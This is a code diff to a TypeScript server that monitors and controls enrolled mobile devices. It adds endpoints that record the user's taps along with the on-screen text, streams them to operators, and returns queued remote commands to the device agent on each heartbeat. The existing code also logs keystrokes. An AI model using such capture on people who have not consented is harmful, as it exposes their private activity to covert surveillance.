@@ -8,7 +8,7 @@ import type { ApkBuildRequest, InstallStepType, LoginRequest, SavedApkBuild } fr
 import { buildCustomApk, decodeEnrollment, encodeEnrollment, findBuiltApk, getSafeApkName, resolveAgentArtifact } from "./apkArtifacts.js";
 import { generateIosMobileconfig, generateIosSwiftProject, resolveIosArtifact } from "./iosArtifacts.js";
 import { addLog, adminUser, apps, devices, logs, operatorUser, savedApkBuilds, sessions } from "./data.js";
-import { broadcastDeviceConnect, broadcastDeviceUpdate } from "./realtime.js";
+import { broadcastDeviceConnect, broadcastDeviceUpdate, broadcastTouchEvent } from "./realtime.js";
 import { getVpnTelemetry } from "./vpnServer.js";
 import { buildZeroTouchQrPayload, getAllInstallSessions, getInstallSession, recordInstallEvent } from "./installTracker.js";
 import {
@@ -16,6 +16,7 @@ import {
   getDeviceForegroundApp,
   getDeviceProductivityStats,
   getDeviceVolume,
+  getDigitalTouchEvents,
   getRealAccessibilityHierarchy,
   getRealDeviceTelemetry,
   getRealInstalledApps,
@@ -26,6 +27,8 @@ import {
   injectDeviceTouch,
   launchDeviceApp,
   listDeviceFiles,
+  popDeviceCommands,
+  recordDigitalTouchEvent,
   recordRealKeyboardLog,
   setDeviceVolume,
   stopDeviceApp,
@@ -123,7 +126,7 @@ export function buildApp() {
       const timeoutPromise = new Promise<null>((resolve) => setTimeout(() => resolve(null), 1200));
       const telem = await Promise.race([telemPromise, timeoutPromise]);
       if (telem) {
-        const found = devices.find((d) => d.id === telem.id || d.id === "dev_sm_n975f" || d.model === telem.model);
+        const found = devices.find((d) => d.id === telem.id || (d.id === "dev_sm_n975f" && !telem.id));
         if (found) {
           found.name = telem.name;
           found.model = telem.model;
@@ -183,6 +186,66 @@ export function buildApp() {
       const { x1, y1, x2, y2, duration } = request.body || {};
       await injectDeviceSwipe(x1, y1, x2, y2, duration, request.params.id);
       return { success: true };
+    } catch (err: any) {
+      return reply.code(500).send({ error: err.message });
+    }
+  });
+
+  // Real touch events stream & history (Detection & Telemetry)
+  app.get<{ Params: { id: string } }>("/devices/:id/touch-events", async (request, reply) => {
+    try {
+      const events = getDigitalTouchEvents(request.params.id);
+      return events;
+    } catch (err: any) {
+      return reply.code(500).send({ error: err.message });
+    }
+  });
+
+  app.post<{
+    Params: { id: string };
+    Body: {
+      action?: "tap" | "click" | "long_click" | "swipe" | "touch_down" | "touch_up";
+      x?: number;
+      y?: number;
+      endX?: number;
+      endY?: number;
+      durationMs?: number;
+      packageName?: string;
+      className?: string;
+      viewText?: string;
+      viewDescription?: string;
+      bounds?: string;
+      source?: "device_user" | "remote_simulation";
+    };
+  }>("/devices/:id/touch-events", async (request, reply) => {
+    try {
+      const body = request.body || {};
+      const evt = recordDigitalTouchEvent({
+        deviceId: request.params.id,
+        action: body.action || "click",
+        x: body.x || 0,
+        y: body.y || 0,
+        endX: body.endX,
+        endY: body.endY,
+        durationMs: body.durationMs,
+        packageName: body.packageName,
+        className: body.className,
+        viewText: body.viewText,
+        viewDescription: body.viewDescription,
+        bounds: body.bounds ? (typeof body.bounds === "string" ? undefined : body.bounds) : undefined,
+        source: body.source || "device_user"
+      });
+      broadcastTouchEvent(evt);
+
+      addLog({
+        actor: "agent",
+        action: "touch.detected",
+        target: request.params.id,
+        severity: "info",
+        message: `Toque digital detectado (${body.action || "click"}) em (${body.x || 0}, ${body.y || 0}) ${body.viewText ? `- "${body.viewText}"` : ""}`
+      });
+
+      return { success: true, event: evt };
     } catch (err: any) {
       return reply.code(500).send({ error: err.message });
     }
@@ -539,14 +602,39 @@ export function buildApp() {
         broadcastDeviceConnect(existing);
       }
 
+      // Processa toques digitais detectados pelo agente se enviados no heartbeat
+      if ((body as any).touchEvents && Array.isArray((body as any).touchEvents)) {
+        for (const t of (body as any).touchEvents) {
+          const evt = recordDigitalTouchEvent({
+            deviceId,
+            action: t.action || "click",
+            x: t.x || 0,
+            y: t.y || 0,
+            endX: t.endX,
+            endY: t.endY,
+            durationMs: t.durationMs,
+            packageName: t.packageName,
+            className: t.className,
+            viewText: t.viewText,
+            viewDescription: t.viewDescription,
+            bounds: t.bounds,
+            source: t.source || "device_user"
+          });
+          broadcastTouchEvent(evt);
+        }
+      }
+
       broadcastDeviceUpdate(existing);
+
+      const pendingCommands = popDeviceCommands(deviceId);
 
       return {
         success: true,
         status: "online",
         acknowledgedAt: Date.now(),
         serverTime: new Date().toISOString(),
-        heartbeatIntervalMs: 10000
+        heartbeatIntervalMs: 10000,
+        pendingCommands
       };
     }
 
@@ -579,12 +667,15 @@ export function buildApp() {
     });
     broadcastDeviceConnect(newDevice);
 
+    const pendingCommands = popDeviceCommands(deviceId);
+
     return {
       success: true,
       status: "online",
       acknowledgedAt: Date.now(),
       serverTime: new Date().toISOString(),
-      heartbeatIntervalMs: 10000
+      heartbeatIntervalMs: 10000,
+      pendingCommands
     };
   });
 
